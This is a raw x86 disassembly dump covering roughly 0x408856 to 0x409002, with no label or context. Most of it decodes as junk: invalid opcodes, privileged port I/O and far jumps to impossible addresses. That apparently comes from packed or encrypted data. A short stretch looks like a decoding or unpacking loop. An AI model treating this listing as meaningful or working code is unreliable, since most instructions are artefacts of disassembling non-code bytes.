  408856:	out    dx,eax
  408857:	cmp    eax,0xc3a7015a
  40885c:	push   es
  40885d:	clc    
  40885e:	or     BYTE PTR [esi+0x1bb9baf4],0x6e
  408865:	push   ebx
  408866:	jecxz  0x408850
  408868:	sti    
  408869:	dec    ebp
  40886a:	or     DWORD PTR [ecx+0x59],0x66
  40886e:	xor    al,bl
  408870:	call   0x425ed185
  408875:	adc    edx,ebx
  408877:	xor    esp,eax
  408879:	(bad)
  40887e:	iret   
  40887f:	jb     0x4088b1
  408881:	mov    dh,0x21
  408883:	inc    eax
  408884:	int    0xd7
  408886:	cld    
  408887:	js     0x408831
  408889:	gs int 0x8c
  40888c:	inc    esi
  40888d:	int    0x62
  40888f:	scas   al,BYTE PTR es:[edi]
  408890:	ror    BYTE PTR [eax+0x319bf405],0x51
  408897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408898:	in     al,0x21
  40889a:	xchg   esp,eax
  40889b:	lods   al,BYTE PTR ds:[esi]
  40889c:	add    al,0x47
  40889e:	push   edi
  40889f:	stc    
  4088a0:	add    ch,BYTE PTR [eax+0x2f62d705]
  4088a6:	mov    esi,0xc56545ed
  4088ab:	dec    esi
  4088ac:	pushf  
  4088ad:	(bad)  
  4088af:	std    
  4088b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088b1:	out    dx,al
  4088b2:	sbb    eax,0xdba74fcb
  4088b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b8:	rol    DWORD PTR [esi+0x10fe4860],0xde
  4088bf:	or     ah,dl
  4088c1:	mov    bl,0x83
  4088c3:	mov    al,0x57
  4088c5:	jb     0x40888e
  4088c7:	and    BYTE PTR [esi+0x75fb6453],al
  4088cd:	push   esp
  4088ce:	push   ss
  4088cf:	out    dx,al
  4088d0:	mul    DWORD PTR [ebx+0x50]
  4088d3:	lds    esp,FWORD PTR [edx]
  4088d5:	scas   eax,DWORD PTR es:[edi]
  4088d6:	fld    DWORD PTR [esi]
  4088d8:	mov    ebx,0x74866f23
  4088dd:	sbb    ah,BYTE PTR ds:0x87431c4d
  4088e3:	cmp    al,0xa7
  4088e5:	jge    0x4088aa
  4088e7:	inc    esp
  4088e8:	adc    esp,DWORD PTR [esi+0x13]
  4088eb:	adc    dl,BYTE PTR es:[edx]
  4088ee:	pop    esp
  4088ef:	addr16 inc esi
  4088f1:	cmp    BYTE PTR [esi],al
  4088f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088f4:	les    ebp,FWORD PTR [eax-0x22]
  4088f7:	mov    DWORD PTR [ebp+eiz*8+0x67],edi
  4088fb:	(bad)  
  4088fc:	push   ds
  4088fd:	cmp    eax,0x71545a16
  408902:	pop    edx
  408903:	and    dh,BYTE PTR [edi]
  408905:	xor    DWORD PTR [esi+0x5c9034ac],ebx
  40890b:	cwde   
  40890c:	push   cs
  40890d:	mov    ecx,0x340c27f3
  408912:	cmp    ebp,DWORD PTR [eax+0x71]
  408915:	dec    DWORD PTR [ebx]
  408917:	fcom   DWORD PTR [eax+0x1d66d75]
  40891d:	sub    cl,ch
  40891f:	sub    ebp,edx
  408921:	in     eax,dx
  408922:	test   eax,0x2a8ffa68
  408927:	pop    edi
  408928:	retf   
  408929:	or     DWORD PTR [ebx+0x491145bc],edi
  40892f:	(bad)  
  408931:	push   ebp
  408932:	lods   eax,DWORD PTR ds:[esi]
  408933:	push   ebp
  408934:	sbb    al,cl
  408936:	das    
  408937:	sbb    al,0xb7
  408939:	scas   al,BYTE PTR es:[edi]
  40893a:	dec    esp
  40893b:	mov    WORD PTR [eax-0x18807ebc],gs
  408941:	sub    al,0xc5
  408943:	mov    esp,DWORD PTR ds:0x571530de
  408949:	jge    0x4088e5
  40894b:	adc    ebp,ebx
  40894d:	pop    ss
  40894e:	fadd   QWORD PTR [edx+eax*4]
  408951:	lock and esp,esi
  408954:	jnp    0x4088ee
  408956:	jo     0x4088f0
  408958:	sub    eax,0x4aa7e645
  40895d:	pushf  
  40895e:	pop    eax
  40895f:	dec    ecx
  408960:	arpl   WORD PTR ds:0xb82a1b07,sp
  408966:	js     0x408930
  408968:	(bad)  
  408969:	adc    BYTE PTR [ebp+0xb],bl
  40896c:	dec    edx
  40896d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40896e:	in     al,0x7
  408970:	dec    BYTE PTR [edi+0x52]
  408973:	push   esi
  408974:	xchg   ebx,eax
  408975:	jg     0x4089cb
  408977:	or     bh,dh
  408979:	into   
  40897a:	sti    
  40897b:	mov    ah,0xa7
  40897d:	aad    0xcc
  40897f:	cmp    al,0xc2
  408981:	xor    ch,BYTE PTR [eax-0x46873c29]
  408987:	adc    cl,ch
  408989:	push   ebx
  40898a:	push   cs
  40898b:	and    BYTE PTR [ebx+0x6ba2fa60],dh
  408991:	pop    ebp
  408992:	arpl   WORD PTR [edx],si
  408994:	cdq    
  408995:	mov    esi,DWORD PTR [edi]
  408997:	push   esi
  408998:	lods   eax,DWORD PTR ds:[esi]
  408999:	mov    esp,0x14ee6ed5
  40899e:	lahf   
  40899f:	out    dx,eax
  4089a0:	jmp    0x4089d5
  4089a2:	dec    esi
  4089a3:	imul   DWORD PTR [ebx+0x45]
  4089a6:	out    dx,eax
  4089a7:	mov    dl,0x60
  4089a9:	push   0x415abf70
  4089ae:	xor    bl,dh
  4089b0:	jns    0x40894a
  4089b2:	daa    
  4089b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089b4:	sub    eax,0x80df739d
  4089b9:	inc    ecx
  4089ba:	jno    0x40894e
  4089bc:	out    dx,al
  4089bd:	fdivrp st(6),st
  4089bf:	test   cl,bl
  4089c1:	fucomip st,st(4)
  4089c3:	jmp    0x15c4f9d2
  4089c8:	icebp  
  4089c9:	mov    BYTE PTR [edx+0x2dbecf99],al
  4089cf:	pop    edx
  4089d0:	xchg   edx,eax
  4089d1:	xchg   ebp,eax
  4089d2:	add    BYTE PTR [eax-0x10],0xb2
  4089d6:	sub    bl,bh
  4089d8:	sbb    DWORD PTR [edx-0x24],edx
  4089db:	or     BYTE PTR [ecx+0x4a],0x31
  4089df:	jno    0x4089b9
  4089e1:	jmp    0xb1cd3547
  4089e6:	out    0xf8,al
  4089e8:	push   esp
  4089e9:	xchg   edi,eax
  4089ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089eb:	test   al,0x21
  4089ed:	push   edi
  4089ee:	dec    ebp
  4089ef:	push   ss
  4089f0:	pop    ds
  4089f1:	pop    ebx
  4089f2:	mov    al,0xf3
  4089f4:	addr16 pusha 
  4089f6:	jb     0x4089d2
  4089f8:	ins    BYTE PTR es:[edi],dx
  4089f9:	or     al,0xed
  4089fb:	test   al,0x85
  4089fd:	jo     0x408a50
  4089ff:	cmp    eax,0x1164f2f1
  408a04:	imul   ecx,DWORD PTR [eax],0x21
  408a07:	lods   al,BYTE PTR ds:[esi]
  408a08:	ficomp DWORD PTR [eax]
  408a0a:	sub    ecx,DWORD PTR [ebx+edx*4]
  408a0d:	or     al,0xc3
  408a0f:	sub    al,0xcd
  408a11:	cmp    BYTE PTR [ecx-0x45118a2c],dh
  408a17:	pop    ss
  408a18:	mov    ebx,0xa6c32293
  408a1d:	pop    es
  408a1e:	sub    dh,BYTE PTR [ebx]
  408a20:	pop    ebp
  408a21:	test   BYTE PTR [edx+eiz*4-0x80],dl
  408a25:	xchg   ecx,eax
  408a26:	stos   BYTE PTR es:[edi],al
  408a27:	dec    esp
  408a28:	jnp    0x408a4a
  408a2a:	xlat   BYTE PTR ds:[ebx]
  408a2b:	xor    ch,BYTE PTR [edi+ebp*8-0x78196c25]
  408a32:	mov    esp,0x535b3c0f
  408a37:	adc    BYTE PTR [esi+0x2757ca56],cl
  408a3d:	mov    ah,0xb1
  408a3f:	mov    DWORD PTR [ebp+0x44ebcbd2],ebp
  408a45:	in     al,dx
  408a46:	out    0xc6,eax
  408a48:	(bad)  
  408a49:	retf   
  408a4a:	fcmovb st,st(1)
  408a4c:	pop    ecx
  408a4d:	mov    al,ds:0x9a07d025
  408a52:	adc    DWORD PTR [ebp+0x11df8ef6],ebx
  408a58:	loop   0x408ac1
  408a5a:	daa    
  408a5b:	ins    BYTE PTR es:[edi],dx
  408a5c:	or     DWORD PTR [ecx-0x37],edi
  408a5f:	jecxz  0x408a3c
  408a61:	or     ecx,edi
  408a63:	mov    edi,0xb4b5ebf4
  408a68:	retf   0x3855
  408a6b:	adc    al,0x27
  408a6d:	nop
  408a6e:	stc    
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0xa3b3a4f9
  408a92:	loopne 0x408aa3
  408a94:	pop    ss
  408a95:	cmp    ah,ah
  408a97:	js     0x408b11
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408ad9
  408a9e:	fstp   TBYTE PTR [esi]
  408aa0:	mov    ebx,DWORD PTR [edi]
  408aa2:	jbe    0x408aa2
  408aa4:	fs or  al,0x6a
  408aa7:	xchg   edx,eax
  408aa8:	mov    ch,0x41
  408aaa:	sub    bl,cl
  408aac:	repz inc ecx
  408aae:	pop    edx
  408aaf:	adc    DWORD PTR [edx-0x7d707c27],edi
  408ab5:	push   es
  408ab6:	mov    esp,?
  408ab8:	inc    ebx
  408ab9:	mov    cl,0x59
  408abb:	call   0xd90b3569
  408ac0:	cwd    
  408ac2:	mov    edx,0x401530e2
  408ac7:	int3   
  408ac8:	retf   
  408ac9:	sub    ah,BYTE PTR [edi-0x15233f04]
  408acf:	and    ebp,DWORD PTR [edx+0x286e24f5]
  408ad5:	and    ecx,DWORD PTR [esi-0x46449b1a]
  408adb:	add    eax,0xd724def8
  408ae0:	test   BYTE PTR [edx-0x67],al
  408ae3:	jae    0x408b55
  408ae5:	enter  0xb826,0x77
  408ae9:	test   DWORD PTR [eax],ecx
  408aeb:	shr    BYTE PTR [ebx-0x55f786a6],cl
  408af1:	sbb    al,0x6f
  408af3:	gs and ebx,edi
  408af6:	out    dx,al
  408af7:	je     0x408b24
  408af9:	lea    eax,[edi+0x4e9132be]
  408aff:	pop    ebp
  408b00:	jmp    0x11a7cf5d
  408b05:	call   DWORD PTR [edi]
  408b07:	mov    ecx,0x775f1546
  408b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b0d:	mov    eax,ds:0x85c8c18
  408b12:	fs pop es
  408b14:	sbb    eax,0xdc402224
  408b19:	jo     0x408b59
  408b1b:	retf   0x89dd
  408b1e:	pop    edx
  408b1f:	pop    ds
  408b20:	jb     0x408aae
  408b22:	rol    DWORD PTR ds:0x4d3dfd02,1
  408b28:	add    edi,ebx
  408b2a:	sbb    DWORD PTR [edi-0x7d],ebx
  408b2d:	ins    DWORD PTR es:[edi],dx
  408b2e:	mov    ah,0x2c
  408b30:	iret   
  408b31:	jbe    0x408abb
  408b33:	and    BYTE PTR [edx-0x5e],al
  408b36:	aad    0x34
  408b38:	pop    ds
  408b39:	jns    0x408b51
  408b3b:	leave  
  408b3c:	lahf   
  408b3d:	mov    bl,ch
  408b3f:	sub    al,0x45
  408b41:	inc    edx
  408b42:	fstp   DWORD PTR ds:0x4d8ee3a5
  408b48:	mov    ah,0x80
  408b4a:	jmp    0x8afa:0x2fbea32d
  408b51:	and    BYTE PTR [eax+0x5e713ea],cl
  408b57:	call   0xa9aa64f6
  408b5c:	lods   al,BYTE PTR ds:[esi]
  408b5d:	cmp    al,0x5d
  408b5f:	sbb    ah,bh
  408b61:	lods   al,BYTE PTR ds:[esi]
  408b62:	call   0x1ed4:0x54a1f368
  408b69:	cwde   
  408b6a:	pop    esi
  408b6b:	test   BYTE PTR [ecx+0x4b],ah
  408b6e:	xor    BYTE PTR [edi+0x1f],dl
  408b71:	(bad)  
  408b72:	mov    ecx,0xead5bc67
  408b77:	pop    edx
  408b78:	(bad)  
  408b79:	nop
  408b7a:	gs fcmovbe st,st(2)
  408b7d:	sahf   
  408b7e:	clc    
  408b7f:	xlat   BYTE PTR ds:[ebx]
  408b80:	es scas eax,DWORD PTR es:[edi]
  408b82:	sbb    eax,0x4723c210
  408b87:	xor    eax,0xd928b0d2
  408b8c:	push   ecx
  408b8d:	pop    ebp
  408b8e:	fisttp DWORD PTR [esi-0x14]
  408b91:	mov    BYTE PTR [esi],0xfc
  408b94:	aas    
  408b95:	sub    DWORD PTR [ebx+ecx*1],ebx
  408b98:	int    0x13
  408b9a:	stos   DWORD PTR es:[edi],eax
  408b9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b9c:	sub    ebp,DWORD PTR [esi+0x4a70b592]
  408ba2:	retf   
  408ba3:	imul   ebp,DWORD PTR [esi-0x11a4221e],0xffffffbe
  408baa:	enter  0x2c30,0x24
  408bae:	push   esp
  408baf:	hlt    
  408bb0:	or     DWORD PTR [edx-0x16],esi
  408bb3:	jbe    0x408bd4
  408bb5:	sbb    al,0x7b
  408bb7:	pop    ss
  408bb8:	lds    edx,FWORD PTR ds:0x483b35b0
  408bbe:	adc    edx,DWORD PTR [ecx+eiz*4]
  408bc1:	sbb    eax,0xc8d5b798
  408bc6:	mov    edi,0x612ade0b
  408bcb:	jae    0x408b76
  408bcd:	and    esi,esp
  408bcf:	loop   0x408bce
  408bd1:	and    eax,0x61aff011
  408bd6:	xor    ch,BYTE PTR [eax]
  408bd8:	scas   eax,DWORD PTR es:[edi]
  408bd9:	inc    edi
  408bda:	dec    esi
  408bdb:	sbb    DWORD PTR [esi+0x4d],esp
  408bde:	mov    bl,0xd
  408be0:	sbb    BYTE PTR [esi+0x34],bh
  408be3:	add    bh,dl
  408be5:	adc    dh,BYTE PTR [ebx-0xa33012c]
  408beb:	pop    esp
  408bec:	call   0x3bf0:0x55277b20
  408bf3:	add    ebx,ebp
  408bf5:	pop    ebp
  408bf6:	mov    fs,ebp
  408bf8:	out    dx,eax
  408bf9:	test   al,0x0
  408bfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bfc:	sbb    ch,BYTE PTR [ecx]
  408bfe:	(bad)  
  408bff:	add    eax,0x1864187a
  408c04:	sub    DWORD PTR fs:[edi],ebp
  408c07:	xchg   ecx,edi
  408c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c0a:	scas   al,BYTE PTR es:[edi]
  408c0b:	in     eax,dx
  408c0c:	or     eax,0x3836c020
  408c11:	pop    edx
  408c12:	dec    edi
  408c13:	jns    0x408c83
  408c15:	(bad)  [ebx-0x65d88bac]
  408c1b:	push   0xffffff9f
  408c1d:	lods   al,BYTE PTR gs:[esi]
  408c1f:	sub    al,0x18
  408c21:	xchg   ebp,ecx
  408c23:	inc    eax
  408c24:	adc    DWORD PTR [ebx],eax
  408c26:	fimul  WORD PTR [ebx-0x36]
  408c29:	inc    ecx
  408c2a:	loop   0x408bdb
  408c2c:	out    0x41,eax
  408c2e:	iret   
  408c2f:	clc    
  408c30:	push   ebx
  408c31:	add    eax,0x5ab6ec99
  408c36:	fucomi st,st(7)
  408c38:	xor    al,0x61
  408c3a:	cli    
  408c3b:	stc    
  408c3c:	and    esi,DWORD PTR [eax+ecx*2-0x7c1b453a]
  408c43:	jmp    0x408c1b
  408c45:	xor    BYTE PTR [eax+0x710ed790],cl
  408c4b:	mov    dh,0xd1
  408c4d:	(bad)  
  408c4f:	xor    BYTE PTR [edx+0x26],al
  408c52:	xor    eax,0xd4429d94
  408c57:	mov    dh,0x85
  408c59:	(bad)  
  408c5a:	push   ebx
  408c5b:	mov    eax,ds:0x26f97a8d
  408c60:	(bad)  
  408c61:	jle    0x408c91
  408c63:	mov    esp,0x674fc3a8
  408c68:	aad    0x9
  408c6a:	ins    BYTE PTR es:[edi],dx
  408c6b:	mov    dl,0xda
  408c6d:	aas    
  408c6e:	pop    ebx
  408c6f:	js     0x408c86
  408c71:	mov    WORD PTR [edi],gs
  408c73:	outs   dx,DWORD PTR ds:[esi]
  408c74:	leave  
  408c75:	hlt    
  408c76:	dec    esp
  408c77:	jl     0x408c80
  408c79:	jmp    0x408cb5
  408c7b:	data16 jbe 0x408c97
  408c7e:	nop
  408c7f:	xchg   edi,eax
  408c80:	mov    ch,0x9e
  408c82:	dec    ebx
  408c83:	dec    esi
  408c84:	pop    esi
  408c85:	pop    ebx
  408c86:	cli    
  408c87:	shl    esi,cl
  408c89:	arpl   WORD PTR [edi],si
  408c8b:	sbb    DWORD PTR [ebp-0x32],esi
  408c8e:	add    ecx,DWORD PTR [esi+0x493e28d1]
  408c94:	sbb    DWORD PTR [ebp-0x187fba8f],esi
  408c9a:	cmp    DWORD PTR [ecx-0x496a70ea],edi
  408ca0:	aad    0x1f
  408ca2:	loop   0x408c5f
  408ca4:	sub    DWORD PTR [edi+ecx*1],eax
  408ca7:	daa    
  408ca8:	xchg   esi,eax
  408ca9:	add    bl,BYTE PTR [edx-0x3f]
  408cac:	push   ebp
  408cad:	lods   eax,DWORD PTR ds:[esi]
  408cae:	retf   
  408caf:	dec    edx
  408cb0:	mov    BYTE PTR [ebx-0x4e],ah
  408cb3:	retf   0x2934
  408cb6:	add    BYTE PTR [edx+0x6c],bl
  408cb9:	loopne 0x408caa
  408cbb:	mov    ah,0x3d
  408cbd:	ret    
  408cbe:	icebp  
  408cbf:	adc    dh,dl
  408cc1:	mov    eax,ds
  408cc3:	adc    BYTE PTR [ebx+0x1e],ah
  408cc6:	ficomp WORD PTR [edi+0x24055e12]
  408ccc:	pop    eax
  408ccd:	inc    ebp
  408cce:	push   edx
  408ccf:	adc    DWORD PTR [ebp-0x20abe93a],0xa26a7133
  408cd9:	scas   al,BYTE PTR es:[edi]
  408cda:	lods   al,BYTE PTR ds:[esi]
  408cdb:	mov    ebp,0x6701f484
  408ce0:	sti    
  408ce1:	lods   al,BYTE PTR ds:[esi]
  408ce2:	loopne 0x408d2b
  408ce4:	pshufw mm1,QWORD PTR [ecx+0x2f],0x92
  408ce9:	jb     0x408ced
  408ceb:	lea    esp,[edx+0x3c8363bf]
  408cf1:	lods   eax,DWORD PTR ds:[si]
  408cf3:	jge    0x408c9f
  408cf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cf6:	(bad)  
  408cf8:	outs   dx,DWORD PTR ds:[esi]
  408cf9:	mov    DWORD PTR [ebp+0x3451adc2],0x95145a75
  408d03:	out    0x20,eax
  408d05:	loope  0x408cfa
  408d07:	sbb    eax,0x3da870b8
  408d0c:	dec    esp
  408d0d:	clc    
  408d0e:	or     dl,bh
  408d10:	dec    eax
  408d11:	lds    ebp,FWORD PTR [ebx+0x33e11471]
  408d17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d18:	fdivr  QWORD PTR [edx-0x7c]
  408d1b:	nop
  408d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d1d:	mov    ah,0xb6
  408d1f:	aad    0x8f
  408d21:	mov    al,0xd9
  408d23:	in     eax,0x39
  408d25:	or     BYTE PTR [edx+0x15],dh
  408d28:	xchg   ecx,eax
  408d29:	(bad)  
  408d2a:	mov    ds:0x62b87bb7,eax
  408d2f:	push   es
  408d30:	push   esi
  408d31:	or     bl,0xaa
  408d34:	(bad)  
  408d35:	dec    bh
  408d37:	repz cmc 
  408d39:	push   0x13
  408d3b:	adc    DWORD PTR [edi+0x60],edi
  408d3e:	jge    0x408d52
  408d40:	(bad)  
  408d41:	ret    
  408d42:	std    
  408d43:	aam    0x83
  408d45:	mov    ebx,0x38f845c7
  408d4a:	test   DWORD PTR [eax+edi*8+0x39fc45c7],ebx
  408d51:	test   DWORD PTR [eax+edi*8+0x3fc458b],ebx
  408d58:	rcl    BYTE PTR [esi-0x75],cl
  408d5b:	adc    eax,0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xfffffff8
  408e1d:	jmp    0x7878:0xea674271
  408e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e25:	jle    0x408e9f
  408e27:	js     0x408e82
  408e29:	pop    edx
  408e2a:	lock scas al,BYTE PTR es:[edi]
  408e2c:	sub    BYTE PTR [ebp-0x3a],0xb9
  408e30:	xchg   DWORD PTR [ebp-0x4283ba88],esp
  408e36:	aam    0xee
  408e38:	adc    al,0x6c
  408e3a:	iret   
  408e3b:	inc    edx
  408e3c:	sbb    bh,BYTE PTR [edi+ecx*1]
  408e3f:	dec    esp
  408e40:	(bad)  
  408e41:	sub    ecx,eax
  408e43:	out    dx,eax
  408e44:	div    DWORD PTR [ebx-0x29]
  408e47:	mov    ebx,eax
  408e49:	call   0xbfe5b2ac
  408e4e:	in     eax,0x8c
  408e50:	rcr    BYTE PTR [ebx+0x53],cl
  408e53:	pusha  
  408e54:	shl    BYTE PTR [edi-0x23],1
  408e57:	pop    edx
  408e58:	adc    al,BYTE PTR [eax+ebp*2+0x1]
  408e5c:	scas   eax,DWORD PTR es:[edi]
  408e5d:	jne    0x408def
  408e5f:	pop    ss
  408e60:	push   edi
  408e61:	fdivr  DWORD PTR [ecx]
  408e63:	not    DWORD PTR [eax+0x7a275734]
  408e69:	and    ebp,DWORD PTR [ecx]
  408e6b:	jle    0x408e63
  408e6d:	sbb    DWORD PTR ds:0xe574dc5e,edi
  408e73:	cwde   
  408e74:	dec    ebp
  408e75:	mov    edx,0xfa2ee0b9
  408e7a:	icebp  
  408e7b:	dec    edi
  408e7c:	mov    ecx,0x146fd83d
  408e81:	jge    0x408e53
  408e83:	and    dh,BYTE PTR [edi]
  408e85:	(bad)  
  408e86:	fwait
  408e87:	jge    0x408eff
  408e89:	xchg   esp,eax
  408e8a:	sahf   
  408e8b:	push   0xffffff9f
  408e8d:	cld    
  408e8e:	pop    ds
  408e8f:	push   cs
  408e90:	std    
  408e91:	(bad)  
  408e92:	cmp    eax,DWORD PTR [edi+0x13d1d21f]
  408e98:	jl     0x408e26
  408e9a:	and    DWORD PTR [eax+0x7ef1e4b],ebx
  408ea0:	out    dx,al
  408ea1:	fstp   DWORD PTR [ecx-0x327931]
  408ea7:	stos   BYTE PTR es:[edi],al
  408ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ea9:	mov    ds:0xb4c98a93,eax
  408eae:	lods   al,BYTE PTR ds:[esi]
  408eaf:	pop    eax
  408eb0:	clc    
  408eb1:	daa    
  408eb2:	mov    edx,0x5dac964
  408eb7:	push   ds
  408eb8:	out    dx,eax
  408eb9:	fadd   QWORD PTR [eax-0x107dfad7]
  408ebf:	aas    
  408ec0:	mov    esp,0x797fb68b
  408ec5:	jg     0x408ee8
  408ec7:	jne    0x408eed
  408ec9:	int3   
  408eca:	jne    0x408ef7
  408ecc:	lods   al,BYTE PTR ds:[esi]
  408ecd:	jl     0x408eca
  408ecf:	mov    ah,0xdd
  408ed1:	mov    ecx,0x927d3aef
  408ed6:	loop   0x408ed2
  408ed8:	ret    
  408ed9:	mov    ecx,0x71d88333
  408ede:	pushf  
  408edf:	lock sbb BYTE PTR [edx-0x2efea328],ah
  408ee6:	xor    ecx,DWORD PTR [edi-0x7461d0f5]
  408eec:	rol    ch,1
  408eee:	pop    ebx
  408eef:	bound  eax,QWORD PTR [ecx]
  408ef1:	adc    BYTE PTR [edi],bh
  408ef3:	sub    bh,BYTE PTR [esi+0x5f]
  408ef6:	mov    bl,0x80
  408ef8:	and    BYTE PTR [ebp-0x9],ch
  408efb:	aam    0x58
  408efd:	push   ecx
  408efe:	mov    ebp,0x4bc2f41b
  408f03:	mov    DWORD PTR [esi],esi
  408f05:	jne    0x408f0c
  408f07:	push   edx
  408f08:	adc    ah,BYTE PTR [eax+0x419a929d]
  408f0e:	inc    ebx
  408f0f:	repnz adc ch,BYTE PTR [edx+ebx*2+0x33]
  408f14:	sub    al,0x3f
  408f16:	in     eax,0x66
  408f18:	dec    edi
  408f19:	xchg   DWORD PTR [ebx],esp
  408f1b:	in     al,dx
  408f1c:	aad    0xd9
  408f1e:	push   es
  408f1f:	pop    edx
  408f20:	sahf   
  408f21:	pop    ds
  408f22:	inc    eax
  408f23:	popa   
  408f24:	cdq    
  408f25:	pop    eax
  408f26:	or     DWORD PTR [eax-0x63],esp
  408f29:	mov    ebx,0x588b9073
  408f2e:	adc    al,BYTE PTR [edi-0xc1ca97a]
  408f34:	mov    bp,0x8456
  408f38:	sub    DWORD PTR [ecx],eax
  408f3a:	in     al,0xa0
  408f3c:	add    al,0x2c
  408f3e:	dec    ebp
  408f3f:	gs pop ss
  408f41:	push   ebx
  408f42:	pop    ebx
  408f43:	jnp    0x408f65
  408f45:	sub    eax,0x366a405f
  408f4a:	mov    esi,0x915c0d2a
  408f4f:	or     edi,DWORD PTR [ebp-0x16]
  408f52:	pop    es
  408f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f54:	rol    eax,0x89
  408f57:	ret    0x2ec
  408f5a:	jg     0x408f9a
  408f5c:	push   ss
  408f5d:	add    bh,BYTE PTR [esi]
  408f5f:	loopne 0x408ef3
  408f61:	add    BYTE PTR [edx-0x23],ah
  408f64:	or     DWORD PTR [eax],ebx
  408f66:	mov    dh,0xff
  408f68:	sbb    DWORD PTR [edi+ecx*4+0x110c9ff3],esi
  408f6f:	adc    DWORD PTR [ebp+esi*4+0x68ae878a],ebx
  408f76:	sub    DWORD PTR [edx-0x6a],ebx
  408f79:	jno    0x408f97
  408f7b:	mov    cl,0x3b
  408f7d:	hlt    
  408f7e:	aaa    
  408f7f:	stos   BYTE PTR es:[edi],al
  408f80:	inc    eax
  408f81:	mov    al,ds:0x20c6b224
  408f86:	push   eax
  408f87:	scas   eax,DWORD PTR es:[edi]
  408f88:	adc    dl,0x8b
  408f8b:	add    esp,DWORD PTR [esp+ebp*8+0x3d]
  408f8f:	mul    BYTE PTR [ebp+0x32619b2d]
  408f95:	retf   
  408f96:	mov    ch,0xb0
  408f98:	pop    ebx
  408f99:	(bad)  [ebx-0x54dae7df]
  408f9f:	add    DWORD PTR [ecx],edx
  408fa1:	mov    dl,0xaa
  408fa3:	or     al,0x57
  408fa6:	push   ecx
  408fa7:	call   0xeb0e:0x8c124e0d
  408fae:	int3   
  408faf:	(bad)  
  408fb0:	jmp    FWORD PTR [edi+ebx*8+0x57]
  408fb4:	repz dec BYTE PTR [eax-0x6c99871b]
  408fbb:	jge    0x408fe7
  408fbd:	das    
  408fbe:	xchg   esi,eax
  408fbf:	push   ds
  408fc0:	mov    esp,0x8322c66b
  408fc5:	jne    0x409018
  408fc7:	not    ah
  408fc9:	ret    0xba84
  408fcc:	out    dx,al
  408fcd:	sbb    edi,esi
  408fcf:	scas   eax,DWORD PTR es:[edi]
  408fd0:	sbb    eax,0xe4531e1d
  408fd5:	int3   
  408fd6:	dec    esi
  408fd7:	cmp    ebp,DWORD PTR [edi]
  408fd9:	cmp    DWORD PTR [ebx-0x5f],edi
  408fdc:	scas   al,BYTE PTR es:[edi]
  408fdd:	repz or ecx,DWORD PTR [esp+ebx*2+0x6a]
  408fe2:	push   cs
  408fe3:	pop    esi
  408fe4:	pop    eax
  408fe5:	pop    ss
  408fe6:	push   edx
  408fe7:	fisttp QWORD PTR [edx-0x7d]
  408fea:	cli    
  408feb:	inc    edi
  408fec:	dec    esp
  408fed:	int3   
  408fee:	pop    ds
  408fef:	cmp    bh,0xc6
  408ff2:	icebp  
  408ff3:	stc    
  408ff4:	xor    BYTE PTR [edi+0x9],0x34
  408ff8:	sbb    dh,bl
  408ffa:	(bad)
  408ffd:	pop    esi
  408ffe:	aad    0x9a
  409000:	rcl    dl,cl
  409002:	cdq    
